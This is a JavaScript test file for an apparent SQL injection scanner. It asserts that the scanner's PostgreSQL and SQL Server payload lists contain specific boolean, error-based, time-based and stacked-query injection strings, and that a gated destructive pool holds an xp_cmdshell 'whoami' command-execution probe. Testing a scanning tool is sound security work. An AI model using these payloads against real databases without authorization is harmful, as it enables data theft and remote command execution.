import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import { PAYLOADS, DESTRUCTIVE_PAYLOADS } from '../src/engine/payloads.js';

// ───────────────────────── PostgreSQL 深度覆盖断言 ─────────────────────────

test('PG boolean 含 /**/ 结尾注释符变体', () => {
  const pgBoolean = PAYLOADS.PostgreSQL.boolean;
  assert.ok(
    pgBoolean.some((t) => t === "{ORIG}' AND '1'='1/**/"),
    'PG boolean 应含 {ORIG}\' AND \'1\'=\'1/**/ 注释符变体'
  );
  assert.ok(
    pgBoolean.some((t) => t === "{ORIG}' AND '1'='2/**/"),
    'PG boolean 应含假条件 /**/ 变体'
  );
});

test('PG boolean 含 UPDATE/INSERT 逗号拼接变体', () => {
  const pgBoolean = PAYLOADS.PostgreSQL.boolean;
  assert.ok(
    pgBoolean.some((t) => t === '{ORIG},1=1-- -'),
    'PG boolean 应含 UPDATE 逗号拼接真条件 {ORIG},1=1-- -'
  );
  assert.ok(
    pgBoolean.some((t) => t === '{ORIG},1=2-- -'),
    'PG boolean 应含 UPDATE 逗号拼接假条件 {ORIG},1=2-- -'
  );
});

test('PG boolean 含 ORDER BY 除零变体', () => {
  const pgBoolean = PAYLOADS.PostgreSQL.boolean;
  assert.ok(
    pgBoolean.some((t) => t === '{ORIG},(SELECT 1/0)-- -'),
    'PG boolean 应含 ORDER BY 除零 {ORIG},(SELECT 1/0)-- -'
  );
  assert.ok(
    pgBoolean.some((t) => t === '{ORIG},(SELECT 1)-- -'),
    'PG boolean 应含 ORDER BY 基线 {ORIG},(SELECT 1)-- -'
  );
});

test('PG error 含注释符 /**/ 变体与 CAST 类型族补全', () => {
  const pgError = PAYLOADS.PostgreSQL.error;
  assert.ok(
    pgError.some((t) => t === "{ORIG}' AND CAST((SELECT version()) AS int)/**/"),
    'PG error 应含 /**/ 结尾注释符变体'
  );
  assert.ok(
    pgError.some((t) => t === "{ORIG}' AND 1=CAST((SELECT version()) AS date)-- -"),
    'PG error 应补全 1=CAST(...AS date)'
  );
  assert.ok(
    pgError.some((t) => t === "{ORIG}' AND 1=CAST((SELECT version()) AS boolean)-- -"),
    'PG error 应补全 1=CAST(...AS boolean)'
  );
  assert.ok(
    pgError.some((t) => t === "{ORIG}' AND 1=CAST((SELECT version()) AS integer)-- -"),
    'PG error 应补全 1=CAST(...AS integer)'
  );
});

test('PG error 含 UPDATE 除零与 LIMIT 子句变体', () => {
  const pgError = PAYLOADS.PostgreSQL.error;
  assert.ok(
    pgError.some((t) => t === '{ORIG},1=(SELECT 1/0)-- -'),
    'PG error 应含 UPDATE 逗号拼接除零 {ORIG},1=(SELECT 1/0)-- -'
  );
  assert.ok(
    pgError.some((t) => t === '{ORIG} FETCH FIRST 1 ROWS ONLY; SELECT 1/0-- -'),
    'PG error 应含 LIMIT 子句 FETCH FIRST 除零变体'
  );
});

test('PG time 含注释符 /**/ 变体与 ORDER BY pg_sleep', () => {
  const pgTime = PAYLOADS.PostgreSQL.time;
  assert.ok(
    pgTime.some((t) => t === "{ORIG}' AND pg_sleep({SLEEP})/**/"),
    'PG time 应含 /**/ 结尾注释符变体'
  );
  assert.ok(
    pgTime.some((t) => t === '{ORIG},(SELECT pg_sleep({SLEEP}))-- -'),
    'PG time 应含 ORDER BY pg_sleep 子查询变体'
  );
});

// ───────────────────────── PG 固定索引保护（BooleanBlindDetector 依赖） ─────────────────────────

test('PG boolean [0,2] 单引号真假对未被破坏', () => {
  const b = PAYLOADS.PostgreSQL.boolean;
  assert.equal(b[0], "{ORIG}' AND '1'='1", 'PG boolean[0] 应为单引号真条件');
  assert.equal(b[2], "{ORIG}' AND '1'='2", 'PG boolean[2] 应为单引号假条件');
});

test('PG boolean [1,3] 双引号真假对未被破坏', () => {
  const b = PAYLOADS.PostgreSQL.boolean;
  assert.equal(b[1], '{ORIG}" AND "1"="1', 'PG boolean[1] 应为双引号真条件');
  assert.equal(b[3], '{ORIG}" AND "1"="2', 'PG boolean[3] 应为双引号假条件');
});

test('PG boolean [4,5] 数字型真假对未被破坏', () => {
  const b = PAYLOADS.PostgreSQL.boolean;
  assert.equal(b[4], '{ORIG} AND 1=1', 'PG boolean[4] 应为数字型真条件');
  assert.equal(b[5], '{ORIG} AND 1=2', 'PG boolean[5] 应为数字型假条件');
});

test('PG boolean [6,7] OR-based 布尔对未被破坏', () => {
  const b = PAYLOADS.PostgreSQL.boolean;
  assert.equal(b[6], "{ORIG}' OR '1'='1", 'PG boolean[6] 应为 OR 真条件');
  assert.equal(b[7], "{ORIG}' OR '1'='2", 'PG boolean[7] 应为 OR 假条件');
});

// ───────────────────────── SQL Server 深度覆盖断言 ─────────────────────────

test('MSSQL boolean 含 /**/ 结尾注释符变体', () => {
  const mssqlBoolean = PAYLOADS['SQL Server'].boolean;
  assert.ok(
    mssqlBoolean.some((t) => t === "{ORIG}' AND '1'='1/**/"),
    'MSSQL boolean 应含 {ORIG}\' AND \'1\'=\'1/**/ 注释符变体'
  );
  assert.ok(
    mssqlBoolean.some((t) => t === "{ORIG}' AND '1'='2/**/"),
    'MSSQL boolean 应含假条件 /**/ 变体'
  );
});

test('MSSQL boolean 含 UPDATE/INSERT 逗号拼接变体', () => {
  const mssqlBoolean = PAYLOADS['SQL Server'].boolean;
  assert.ok(
    mssqlBoolean.some((t) => t === '{ORIG},1=1-- -'),
    'MSSQL boolean 应含 UPDATE 逗号拼接真条件 {ORIG},1=1-- -'
  );
  assert.ok(
    mssqlBoolean.some((t) => t === '{ORIG},1=2-- -'),
    'MSSQL boolean 应含 UPDATE 逗号拼接假条件 {ORIG},1=2-- -'
  );
});

test('MSSQL error 含 CONVERT @@version 直引与 /**/ 变体', () => {
  const mssqlError = PAYLOADS['SQL Server'].error;
  assert.ok(
    mssqlError.some((t) => t === "{ORIG}' AND 1=CONVERT(int,@@version)-- -"),
    'MSSQL error 应含 CONVERT(int,@@version) 直引变体'
  );
  assert.ok(
    mssqlError.some((t) => t === "{ORIG}' AND 1=CONVERT(int,@@version)/**/"),
    'MSSQL error 应含 CONVERT(int,@@version)/**/ 注释符变体'
  );
});

test('MSSQL error 含堆叠除零；xp_cmdshell 在 destructive 池', () => {
  const mssqlError = PAYLOADS['SQL Server'].error;
  assert.ok(
    mssqlError.some((t) => t === "{ORIG}'; SELECT 1/0-- -"),
    'MSSQL error 应含堆叠除零 {ORIG}\'; SELECT 1/0-- -'
  );
  // xp_cmdshell 已移入 destructive.js（risk≥3 门控，见 payloadSafety.guard.test.js）
  const destErr = DESTRUCTIVE_PAYLOADS['SQL Server']?.error || [];
  assert.ok(
    destErr.some((t) => t === "{ORIG}'; EXEC xp_cmdshell 'whoami'-- -"),
    'destructive 池应含 xp_cmdshell 探测'
  );
});

test('MSSQL time 含堆叠 WAITFOR 与数字上下文变体', () => {
  const mssqlTime = PAYLOADS['SQL Server'].time;
  assert.ok(
    mssqlTime.some((t) => t === "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -"),
    'MSSQL time 应含堆叠 WAITFOR {ORIG}\'; WAITFOR DELAY \'0:0:{SLEEP}\'-- -'
  );
  assert.ok(
    mssqlTime.some((t) => t === "{ORIG} AND 1=1; WAITFOR DELAY '0:0:{SLEEP}'-- -"),
    'MSSQL time 应含数字上下文 WAITFOR {ORIG} AND 1=1; WAITFOR DELAY \'0:0:{SLEEP}\'-- -'
  );
});

// ───────────────────────── MSSQL 固定索引保护 ─────────────────────────

test('MSSQL boolean [0,2]/[1,3]/[4,5]/[6,7] 真假对未被破坏', () => {
  const b = PAYLOADS['SQL Server'].boolean;
  assert.equal(b[0], "{ORIG}' AND '1'='1");
  assert.equal(b[2], "{ORIG}' AND '1'='2");
  assert.equal(b[1], '{ORIG}" AND "1"="1');
  assert.equal(b[3], '{ORIG}" AND "1"="2');
  assert.equal(b[4], '{ORIG} AND 1=1');
  assert.equal(b[5], '{ORIG} AND 1=2');
  assert.equal(b[6], "{ORIG}' OR '1'='1");
  assert.equal(b[7], "{ORIG}' OR '1'='2");
});
